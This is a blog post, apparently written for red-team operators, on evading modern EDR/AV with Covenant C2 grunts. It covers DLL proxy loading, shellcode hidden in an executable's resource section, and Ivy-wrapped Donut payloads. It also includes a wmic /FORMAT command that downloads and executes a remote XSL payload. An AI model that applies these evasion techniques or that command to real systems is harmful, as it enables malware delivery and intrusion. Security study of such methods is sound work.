<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Covenant In 2022" /><meta name="author" content="Matt C" /><meta property="og:locale" content="en" /><meta name="description" content="Intro&nbsp;&nbsp;&nbsp; What great timing, s3cur3th1ssh1t just made a post on stageless vs staged Grunts in Covenant. Check it out! A quick background before diving in. What is Covenant? Covenant is one of the easiest post exploitation frameworks to spin up. It uses .NET, which is a just-in-time compiled language, to generate &quot;grunts&quot; that connect back to the C2 in order to receive commands. The commands can be received either through PUSH or PULL methods depending on how you want the network traffic to look and the traffic can be further obfuscated through header modification, among other methods, by playing with different profiles. Covenant makes it simple to change almost every aspect of how commands are fetched. In this write up though, we will focus primarily on customizing our grunt delivery.How Do The Grunts Hold Up?&nbsp;&nbsp;&nbsp; Generating simple grunts with Covenant out of the box is quick and modification of their underlying code is fairly easy. There are a few Python scripts to obfuscate common strings in the grunt code (such as removing the term &quot;grunt&quot;) and that comes in very handy. Moreover, once you&#39;ve customized a grunt, you can save that as a template so that you won&#39;t need to repeatedly obfuscate strings. The framework has built in tools to generate payloads in many forms such as XSL stylesheets, b64 encoded Powershell commands, and Donut encrypted shellcode - more on that last one later.&nbsp;&nbsp;&nbsp; All that said, it will take work on the operators part in order to succeed with getting execution off. Where previously you could just generate a payload from the dashboard and get away with sending it to users, now you would get caught immediately.&nbsp;&nbsp;&nbsp;&nbsp; Naturally, your next question might be &quot;Is Covenant still worth using?&quot; And the answer is a resounding yes! There are far more interesting options that we can use than just a plain old executable and we&#39;ll explore some of them below.Built-in Evasion Options?&nbsp;&nbsp;&nbsp; Covenant has many options for evasive grunts, giving attackers a wide range of tools. As mentioned previously, Donut can generate shellcode to run our grunts, operators can output a grunt in the form of an XSL style-sheet and use wmic os get /FORMAT:&quot;https://url&quot; to download and execute it, or you can use DotNetToJScript to generate a grunt to be used in a number of ways like Microsoft HTML application (MSHTA) payloads.&nbsp;&nbsp;&nbsp; &nbsp;Covenant evidently has some well thought out evasion options built into it. It&#39;s worth reviewing Donut specifically though for a moment since we&#39;ll utilize it below. A key feature is that Donut allows in memory execution of shellcode. Specifically, this shellcode is going to be position independent so that it can be executed from anywhere. How this works at a super high level is that once the grunt is executed, Donut sets up a new application domain meant to run the .NET assembly, shellcode gets loaded into there, and then finally executed. Hiding The Grunts&nbsp;&nbsp;&nbsp; Covenant has been around for a long time at this point. There have been quite a few people who have developed different tactics throughout the years that have evaded antivirus. But in 2022 a lot of these don&#39;t hold up nearly as well. In 2021/2022, we saw a great advance in EDR&#39;s ability to detect malicious actions in files and in memory. There are three techniques for running the Donut shellcode that hold up relatively well despite these advances in detection and below we&#39;ll review how they work.DLL Proxy Loading&nbsp;&nbsp; &nbsp;This method is the least effective out of the three, but least effective doesn&#39;t it won&#39;t work and it&#39;s up against some stiff competition. What this method does is read in the shellcode.bin file and then use VirtualAlloc to allocate a memory region before copying the shellcode contents into it using memcpy. A simple but effective solution.&nbsp;&nbsp;&nbsp; &nbsp;A lot of EDR/AV had trouble identifying and scanning the shellcode file generated through Donut. But this method has the drawback of needing to drop the DLL and the shellcode seperately, as opposed to just one application or file. Redteaming.co.uk has a great right up though on doing this here. If you would like to use this technique, it&#39;s advised you use a staged dropper to facilitate retrieving both the needed shellcode and the DLL as well as executing the DLL once both are downloaded.Hiding Shellcode in the .RSRC Section&nbsp;&nbsp; &nbsp;Another method for getting the aforementioned shellcode onto the victims system is to generate the shellcode bin and then add it to an applications resource section. This is a common technique that offensive security programmers use to hide their payloads and it&#39;s not unique to Covenant. Once added here, we can extract the grunt from the invalid ico file and allocate it to memory and execute! Find a more detailed write up on this here.&nbsp;&nbsp;&nbsp; &nbsp;This technique works great for payloads since this is contained within one file. Getting this onto a system can be accomplished either through a staged or stageless dropper since the grunt is only one file and it&#39;s a simple executable that a user can start.&nbsp;Evasion With Ivy&nbsp;&nbsp;&nbsp; The third method for evasion, and it&#39;s one of my favorites. Ivy is a payload generation tool developed by Optiv. If you haven&#39;t heard of it before, you should read more about it here. Basically though, Ivy takes shellcode, encrypts it, and then and executes it in memory. Ivy accomplishes this by spawning a hidden Excel process and loading the encrypted payload strings into a VBA function. It comes with a number of options for evasion built in like breaking up lines into chunks (so that no one line can be determined to be anything but random characters) and an EDR unhooking mode that builds it&#39;s own version of WriteProcessMemory. We can couple Ivy with Covenants ability to generate a Donut payload and find a lot of success in evading modern AV. One small drawback though is that we do need the victim to have Office installed.&nbsp;&nbsp;&nbsp; Generating a payload is super simple. You have options for either staged or stageless, remote process injection or local execution, and a number of different delivery options. Below is a simple example of generating a stageless payload with the Donut bin that Covenant output. &nbsp;&nbsp;&nbsp; The generated payloads see a big drop in both attribution and detection rates when compared to the bin that we embedded inside of it.&nbsp;&nbsp;&nbsp; &nbsp;Executing the Ivy payload is equally as simple, the user just needs to double click it. Windows will execute it with the script host and then the grunt will check in. &nbsp;Lessons Learned &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; It should be evident by now that Covenant can still be used quite effectively in 2022. Covenant comes with a feature rich interface that is really nice to see in a free and open source platform and it is very simple and quick to modify grunts. In this post, we have reviewed three techniques for running grunts that can evade modern EDR/AV. The grunts we developed only utilized the built-in Donut generator, so there is still plenty left to explore with the other launcher options.&nbsp;&nbsp; &nbsp;This was part one of, hopefully, a multipart series. Next up should be what covenant looks like on the wire and how we can combine user agents and message transformation rules with custom protocols to truly blend in and hide with normal traffic on the wire." /><meta property="og:description" content="Intro&nbsp;&nbsp;&nbsp; What great timing, s3cur3th1ssh1t just made a post on stageless vs staged Grunts in Covenant. Check it out! A quick background before diving in. What is Covenant? Covenant is one of the easiest post exploitation frameworks to spin up. It uses .NET, which is a just-in-time compiled language, to generate &quot;grunts&quot; that connect back to the C2 in order to receive commands. The commands can be received either through PUSH or PULL methods depending on how you want the network traffic to look and the traffic can be further obfuscated through header modification, among other methods, by playing with different profiles. Covenant makes it simple to change almost every aspect of how commands are fetched. In this write up though, we will focus primarily on customizing our grunt delivery.How Do The Grunts Hold Up?&nbsp;&nbsp;&nbsp; Generating simple grunts with Covenant out of the box is quick and modification of their underlying code is fairly easy. There are a few Python scripts to obfuscate common strings in the grunt code (such as removing the term &quot;grunt&quot;) and that comes in very handy. Moreover, once you&#39;ve customized a grunt, you can save that as a template so that you won&#39;t need to repeatedly obfuscate strings. The framework has built in tools to generate payloads in many forms such as XSL stylesheets, b64 encoded Powershell commands, and Donut encrypted shellcode - more on that last one later.&nbsp;&nbsp;&nbsp; All that said, it will take work on the operators part in order to succeed with getting execution off. Where previously you could just generate a payload from the dashboard and get away with sending it to users, now you would get caught immediately.&nbsp;&nbsp;&nbsp;&nbsp; Naturally, your next question might be &quot;Is Covenant still worth using?&quot; And the answer is a resounding yes! There are far more interesting options that we can use than just a plain old executable and we&#39;ll explore some of them below.Built-in Evasion Options?&nbsp;&nbsp;&nbsp; Covenant has many options for evasive grunts, giving attackers a wide range of tools. As mentioned previously, Donut can generate shellcode to run our grunts, operators can output a grunt in the form of an XSL style-sheet and use wmic os get /FORMAT:&quot;https://url&quot; to download and execute it, or you can use DotNetToJScript to generate a grunt to be used in a number of ways like Microsoft HTML application (MSHTA) payloads.&nbsp;&nbsp;&nbsp; &nbsp;Covenant evidently has some well thought out evasion options built into it. It&#39;s worth reviewing Donut specifically though for a moment since we&#39;ll utilize it below. A key feature is that Donut allows in memory execution of shellcode. Specifically, this shellcode is going to be position independent so that it can be executed from anywhere. How this works at a super high level is that once the grunt is executed, Donut sets up a new application domain meant to run the .NET assembly, shellcode gets loaded into there, and then finally executed. Hiding The Grunts&nbsp;&nbsp;&nbsp; Covenant has been around for a long time at this point. There have been quite a few people who have developed different tactics throughout the years that have evaded antivirus. But in 2022 a lot of these don&#39;t hold up nearly as well. In 2021/2022, we saw a great advance in EDR&#39;s ability to detect malicious actions in files and in memory. There are three techniques for running the Donut shellcode that hold up relatively well despite these advances in detection and below we&#39;ll review how they work.DLL Proxy Loading&nbsp;&nbsp; &nbsp;This method is the least effective out of the three, but least effective doesn&#39;t it won&#39;t work and it&#39;s up against some stiff competition. What this method does is read in the shellcode.bin file and then use VirtualAlloc to allocate a memory region before copying the shellcode contents into it using memcpy. A simple but effective solution.&nbsp;&nbsp;&nbsp; &nbsp;A lot of EDR/AV had trouble identifying and scanning the shellcode file generated through Donut. But this method has the drawback of needing to drop the DLL and the shellcode seperately, as opposed to just one application or file. Redteaming.co.uk has a great right up though on doing this here. If you would like to use this technique, it&#39;s advised you use a staged dropper to facilitate retrieving both the needed shellcode and the DLL as well as executing the DLL once both are downloaded.Hiding Shellcode in the .RSRC Section&nbsp;&nbsp; &nbsp;Another method for getting the aforementioned shellcode onto the victims system is to generate the shellcode bin and then add it to an applications resource section. This is a common technique that offensive security programmers use to hide their payloads and it&#39;s not unique to Covenant. Once added here, we can extract the grunt from the invalid ico file and allocate it to memory and execute! Find a more detailed write up on this here.&nbsp;&nbsp;&nbsp; &nbsp;This technique works great for payloads since this is contained within one file. Getting this onto a system can be accomplished either through a staged or stageless dropper since the grunt is only one file and it&#39;s a simple executable that a user can start.&nbsp;Evasion With Ivy&nbsp;&nbsp;&nbsp; The third method for evasion, and it&#39;s one of my favorites. Ivy is a payload generation tool developed by Optiv. If you haven&#39;t heard of it before, you should read more about it here. Basically though, Ivy takes shellcode, encrypts it, and then and executes it in memory. Ivy accomplishes this by spawning a hidden Excel process and loading the encrypted payload strings into a VBA function. It comes with a number of options for evasion built in like breaking up lines into chunks (so that no one line can be determined to be anything but random characters) and an EDR unhooking mode that builds it&#39;s own version of WriteProcessMemory. We can couple Ivy with Covenants ability to generate a Donut payload and find a lot of success in evading modern AV. One small drawback though is that we do need the victim to have Office installed.&nbsp;&nbsp;&nbsp; Generating a payload is super simple. You have options for either staged or stageless, remote process injection or local execution, and a number of different delivery options. Below is a simple example of generating a stageless payload with the Donut bin that Covenant output. &nbsp;&nbsp;&nbsp; The generated payloads see a big drop in both attribution and detection rates when compared to the bin that we embedded inside of it.&nbsp;&nbsp;&nbsp; &nbsp;Executing the Ivy payload is equally as simple, the user just needs to double click it. Windows will execute it with the script host and then the grunt will check in. &nbsp;Lessons Learned &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; It should be evident by now that Covenant can still be used quite effectively in 2022. Covenant comes with a feature rich interface that is really nice to see in a free and open source platform and it is very simple and quick to modify grunts. In this post, we have reviewed three techniques for running grunts that can evade modern EDR/AV. The grunts we developed only utilized the built-in Donut generator, so there is still plenty left to explore with the other launcher options.&nbsp;&nbsp; &nbsp;This was part one of, hopefully, a multipart series. Next up should be what covenant looks like on the wire and how we can combine user agents and message transformation rules with custom protocols to truly blend in and hide with normal traffic on the wire." /><link rel="canonical" href="/posts/covenant-in-2022/" /><meta property="og:url" content="/posts/covenant-in-2022/" /><meta property="og:site_name" content="Culbert Report" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-07T21:38:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Covenant In 2022" /><meta name="twitter:site" content="@mattculbert" /><meta name="twitter:creator" content="@Matt C" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Matt C"},"dateModified":"2022-09-06T19:34:41+00:00","datePublished":"2022-06-07T21:38:00+00:00","description":"Intro&nbsp;&nbsp;&nbsp; What great timing, s3cur3th1ssh1t just made a post on stageless vs staged Grunts in Covenant. Check it out! A quick background before diving in. What is Covenant? Covenant is one of the easiest post exploitation frameworks to spin up. It uses .NET, which is a just-in-time compiled language, to generate &quot;grunts&quot; that connect back to the C2 in order to receive commands. The commands can be received either through PUSH or PULL methods depending on how you want the network traffic to look and the traffic can be further obfuscated through header modification, among other methods, by playing with different profiles. Covenant makes it simple to change almost every aspect of how commands are fetched. In this write up though, we will focus primarily on customizing our grunt delivery.How Do The Grunts Hold Up?&nbsp;&nbsp;&nbsp; Generating simple grunts with Covenant out of the box is quick and modification of their underlying code is fairly easy. There are a few Python scripts to obfuscate common strings in the grunt code (such as removing the term &quot;grunt&quot;) and that comes in very handy. Moreover, once you&#39;ve customized a grunt, you can save that as a template so that you won&#39;t need to repeatedly obfuscate strings. The framework has built in tools to generate payloads in many forms such as XSL stylesheets, b64 encoded Powershell commands, and Donut encrypted shellcode - more on that last one later.&nbsp;&nbsp;&nbsp; All that said, it will take work on the operators part in order to succeed with getting execution off. Where previously you could just generate a payload from the dashboard and get away with sending it to users, now you would get caught immediately.&nbsp;&nbsp;&nbsp;&nbsp; Naturally, your next question might be &quot;Is Covenant still worth using?&quot; And the answer is a resounding yes! There are far more interesting options that we can use than just a plain old executable and we&#39;ll explore some of them below.Built-in Evasion Options?&nbsp;&nbsp;&nbsp; Covenant has many options for evasive grunts, giving attackers a wide range of tools. As mentioned previously, Donut can generate shellcode to run our grunts, operators can output a grunt in the form of an XSL style-sheet and use wmic os get /FORMAT:&quot;https://url&quot; to download and execute it, or you can use DotNetToJScript to generate a grunt to be used in a number of ways like Microsoft HTML application (MSHTA) payloads.&nbsp;&nbsp;&nbsp; &nbsp;Covenant evidently has some well thought out evasion options built into it. It&#39;s worth reviewing Donut specifically though for a moment since we&#39;ll utilize it below. A key feature is that Donut allows in memory execution of shellcode. Specifically, this shellcode is going to be position independent so that it can be executed from anywhere. How this works at a super high level is that once the grunt is executed, Donut sets up a new application domain meant to run the .NET assembly, shellcode gets loaded into there, and then finally executed. Hiding The Grunts&nbsp;&nbsp;&nbsp; Covenant has been around for a long time at this point. There have been quite a few people who have developed different tactics throughout the years that have evaded antivirus. But in 2022 a lot of these don&#39;t hold up nearly as well. In 2021/2022, we saw a great advance in EDR&#39;s ability to detect malicious actions in files and in memory. There are three techniques for running the Donut shellcode that hold up relatively well despite these advances in detection and below we&#39;ll review how they work.DLL Proxy Loading&nbsp;&nbsp; &nbsp;This method is the least effective out of the three, but least effective doesn&#39;t it won&#39;t work and it&#39;s up against some stiff competition. What this method does is read in the shellcode.bin file and then use VirtualAlloc to allocate a memory region before copying the shellcode contents into it using memcpy. A simple but effective solution.&nbsp;&nbsp;&nbsp; &nbsp;A lot of EDR/AV had trouble identifying and scanning the shellcode file generated through Donut. But this method has the drawback of needing to drop the DLL and the shellcode seperately, as opposed to just one application or file. Redteaming.co.uk has a great right up though on doing this here. If you would like to use this technique, it&#39;s advised you use a staged dropper to facilitate retrieving both the needed shellcode and the DLL as well as executing the DLL once both are downloaded.Hiding Shellcode in the .RSRC Section&nbsp;&nbsp; &nbsp;Another method for getting the aforementioned shellcode onto the victims system is to generate the shellcode bin and then add it to an applications resource section. This is a common technique that offensive security programmers use to hide their payloads and it&#39;s not unique to Covenant. Once added here, we can extract the grunt from the invalid ico file and allocate it to memory and execute! Find a more detailed write up on this here.&nbsp;&nbsp;&nbsp; &nbsp;This technique works great for payloads since this is contained within one file. Getting this onto a system can be accomplished either through a staged or stageless dropper since the grunt is only one file and it&#39;s a simple executable that a user can start.&nbsp;Evasion With Ivy&nbsp;&nbsp;&nbsp; The third method for evasion, and it&#39;s one of my favorites. Ivy is a payload generation tool developed by Optiv. If you haven&#39;t heard of it before, you should read more about it here. Basically though, Ivy takes shellcode, encrypts it, and then and executes it in memory. Ivy accomplishes this by spawning a hidden Excel process and loading the encrypted payload strings into a VBA function. It comes with a number of options for evasion built in like breaking up lines into chunks (so that no one line can be determined to be anything but random characters) and an EDR unhooking mode that builds it&#39;s own version of WriteProcessMemory. We can couple Ivy with Covenants ability to generate a Donut payload and find a lot of success in evading modern AV. One small drawback though is that we do need the victim to have Office installed.&nbsp;&nbsp;&nbsp; Generating a payload is super simple. You have options for either staged or stageless, remote process injection or local execution, and a number of different delivery options. Below is a simple example of generating a stageless payload with the Donut bin that Covenant output. &nbsp;&nbsp;&nbsp; The generated payloads see a big drop in both attribution and detection rates when compared to the bin that we embedded inside of it.&nbsp;&nbsp;&nbsp; &nbsp;Executing the Ivy payload is equally as simple, the user just needs to double click it. Windows will execute it with the script host and then the grunt will check in. &nbsp;Lessons Learned &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; It should be evident by now that Covenant can still be used quite effectively in 2022. Covenant comes with a feature rich interface that is really nice to see in a free and open source platform and it is very simple and quick to modify grunts. In this post, we have reviewed three techniques for running grunts that can evade modern EDR/AV. The grunts we developed only utilized the built-in Donut generator, so there is still plenty left to explore with the other launcher options.&nbsp;&nbsp; &nbsp;This was part one of, hopefully, a multipart series. Next up should be what covenant looks like on the wire and how we can combine user agents and message transformation rules with custom protocols to truly blend in and hide with normal traffic on the wire.","headline":"Covenant In 2022","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/covenant-in-2022/"},"url":"/posts/covenant-in-2022/"}</script><title>Covenant In 2022 | Culbert Report</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Culbert Report"><meta name="application-name" content="Culbert Report"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.notify(); } /* flipMode() */ } /* ModeToggle */ const modeToggle = new ModeToggle(); </script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/thumb.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Culbert Report</a></div><div class="site-subtitle font-italic">Get in loser, we're hating AI and bringing back real learning. Site art by Kenton Drumm</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/matt-culbert" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/mattculbert" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['matt','culbertreport.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Covenant In 2022</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Covenant In 2022</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1654637880" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 7, 2022 </em> </span> <span> Updated <em class="" data-ts="1662492881" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 6, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href=""></a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1227 words"> <em>6 min</em> read</span></div></div></div><div class="post-content"><div><h1 style="clear: left; float: left; margin-bottom: 1em; margin-left: 1em; text-align: center;">Intro</h1><h2 style="text-align: left;"><div class="separator" style="clear: both; text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqjl0_YYYm_hElr78pekYkJqa2y0eM_mh0rJzzwOxLK6XNHbMRPX0PnpDbPrfTS9iTtrpwImd0r4F5kvkwZifSGADXWPvTdbA2GV5GnIwmjfu6AaZ24GPcm27Ec9EAuI0ZQNmnWEQ2UB3h3TsgaMEOxaRMTOY8F2ObmmfPztsY8U2TC2-uWbFunDyVvA/s1756/covenant.png" style="margin-left: 1em; margin-right: 1em;" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 506 147'%3E%3C/svg%3E" border="0" data-original-height="510" data-original-width="1756" height="147" data-src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqjl0_YYYm_hElr78pekYkJqa2y0eM_mh0rJzzwOxLK6XNHbMRPX0PnpDbPrfTS9iTtrpwImd0r4F5kvkwZifSGADXWPvTdbA2GV5GnIwmjfu6AaZ24GPcm27Ec9EAuI0ZQNmnWEQ2UB3h3TsgaMEOxaRMTOY8F2ObmmfPztsY8U2TC2-uWbFunDyVvA/w506-h147/covenant.png" width="506" class="lazyload" data-proofer-ignore></a></div></h2><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; </span>What great timing, s3cur3th1ssh1t just made a post on<a href="https://s3cur3th1ssh1t.github.io/Covenant_Stageless_HTTP/" rel="nofollow" target="_blank"> stageless vs staged Grunts in Covenant</a>. Check it out! A quick background before diving in. What is Covenant? Covenant is one of the easiest post exploitation frameworks to spin up. It uses .NET, which is a just-in-time compiled language, to generate "grunts" that connect back to the C2 in order to receive commands. The commands can be received either through PUSH or PULL methods depending on how you want the network traffic to look and the traffic can be further obfuscated through header modification, among other methods, by playing with different profiles. <span>Covenant makes it simple to change almost every aspect of how commands are fetched. In this write up though, we will focus primarily on customizing our grunt delivery.<br /></span></p><p></p><h2 style="text-align: left;">How Do The Grunts Hold Up?</h2><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; </span>Generating simple grunts with Covenant out of the box is quick and modification of their underlying code is fairly easy. There are a few Python scripts to obfuscate common strings in the grunt code (such as removing the term "grunt") and that comes in very handy. Moreover, once you've customized a grunt, you can save that as a template so that you won't need to repeatedly obfuscate strings. The framework has built in tools to generate payloads in many forms such as XSL stylesheets, b64 encoded Powershell commands, and Donut encrypted shellcode - more on that last one later.</p><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; All that said, it will take work on the operators part in order to succeed with getting execution off. Where previously you could just generate a payload from the dashboard and get away with sending it to users, now you would get caught immediately.&nbsp;</span></p><p style="text-align: left;"><span></span></p><div class="separator" style="clear: both; text-align: center;"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwLIvPTq8h0rWNDooiN1tTfNIQTO5I3q7TkZfI3mUPghPx-c4NDlO_uewXcWDzIAVt0UfFQP9uR6H8wwalvRVIv-o8YCTl3G1HroJM_nTZOWy_M3gZ5wY8-yjAkt2oUfgTT-eQ2KHKbDkSi5RLXk9195JMuThiFhF4oR08LOperCNCP3Xa6u5gcSMROQ/s1433/default-detection.png" style="margin-left: 1em; margin-right: 1em;" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 639 302'%3E%3C/svg%3E" border="0" data-original-height="678" data-original-width="1433" height="302" data-src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwLIvPTq8h0rWNDooiN1tTfNIQTO5I3q7TkZfI3mUPghPx-c4NDlO_uewXcWDzIAVt0UfFQP9uR6H8wwalvRVIv-o8YCTl3G1HroJM_nTZOWy_M3gZ5wY8-yjAkt2oUfgTT-eQ2KHKbDkSi5RLXk9195JMuThiFhF4oR08LOperCNCP3Xa6u5gcSMROQ/w639-h302/default-detection.png" width="639" class="lazyload" data-proofer-ignore></a></span></div><span><br /></span><span>&nbsp;&nbsp;&nbsp; </span>Naturally, your next question might be "Is Covenant still worth using?" And the answer is a resounding yes! There are far more interesting options that we can use than just a plain old executable and we'll explore some of them below.<br /><p></p><h2 style="text-align: left;">Built-in Evasion Options?</h2><p style="text-align: left;"><span>&nbsp;&nbsp;&nbsp; </span>Covenant has many options for evasive grunts, giving attackers a wide range of tools. As mentioned previously, Donut can generate shellcode to run our grunts, operators can output a grunt in the form of an XSL style-sheet and use <span style="font-family: courier;">wmic os get /FORMAT:"https://url"</span> to download and execute it, or you can use DotNetToJScript to generate a grunt to be used in a number of ways like Microsoft HTML application (MSHTA) payloads.</p><p style="text-align: center;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjP8-DYjFB7JOlddi5zpSC6_mffztkMfYz_4GHtqkZaRDKqX-7AG6qp_TqczwRsNCCPRmJ70EvXZDKhquSwoSB-95Pe7q0PJXyaN-FwAEBRSKF9WvPSMapi0-KgG9jf0W3-b1ihxGZQedoLIzwMv4NyTj3wwp_WDFOpl0CHEc9TE40phiDAJ6jgFmcDUA/s640/donut.jpg" style="margin-left: 1em; margin-right: 1em;" class="img-link shimmer" ><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 320 156'%3E%3C/svg%3E" border="0" data-original-height="311" data-original-width="640" height="156" 